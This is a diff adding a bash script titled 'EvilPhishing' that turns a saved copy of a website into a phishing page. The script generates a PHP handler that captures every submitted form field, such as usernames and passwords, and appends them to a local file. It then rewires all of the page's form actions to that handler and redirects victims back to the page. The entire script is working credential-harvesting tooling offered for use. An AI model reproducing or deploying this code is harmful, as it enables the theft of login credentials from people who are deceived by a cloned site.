@@ -1,0 +1,52 @@
+#!/bin/bash
+# EvilPhishing
+# Gabriel Haab, Jan 2018
+
+# ============================================================
+# ============== CREATING THE PHISHING PAGE ==================
+# ============================================================
+	mv *.html index.html
+	
+	# ========= Fixing web links ================
+	
+	#fixlink=`cat index.html | grep -Po '(?<='href=\"').*(?='_files')' | sed -n 1p`
+	
+	#sed -i "s|${fixlink}|index|g" index.html
+	
+	# ========= create the php file ==============
+	
+	echo "<?php" > action.php
+	
+	# ====== Inject and change the login forms of the webpage ====
+	
+	number=`cat index.html | grep -o 'name=".*' | cut -d '"' -f 2 | wc -l`
+	
+	for i in `seq 1 $number`; do
+		loucura=`cat index.html | grep -o 'name=".*' | cut -d '"' -f 2| sed -n ${i}p`
+		echo "\$var$i = \$_POST['$loucura'].PHP_EOL;" >> action.php
+	done
+	
+	echo "\$fileHandle = fopen(\"mydatafile\", 'a+');" >> action.php
+	
+	for i in `seq 1 $number`; do
+		echo "fwrite(\$fileHandle,\$var$i);" >> action.php
+	done
+	
+	# ===== Finishing the PHP file ========
+	
+	echo "fwrite(\$fileHandle,'new_user');" >> action.php
+	echo "fclose(\$fileHandle);" >> action.php
+	echo "header(\"location: index.html\");" >> action.php
+	echo "?>" >> action.php
+	
+	# ===== injecting the action.php on the index.html
+	
+	number2=`cat index.html | grep -o 'action=".*' | cut -d '"' -f 2 | wc -l`
+	
+	for i in `seq 1 $number2`; do
+	
+	loucura2=`cat index.html | grep -o 'action=".*' | cut -d '"' -f 2| sed -n ${i}p`
+	
+	sed -i "s|${loucura2}|action.php|g" index.html
+	
+	done
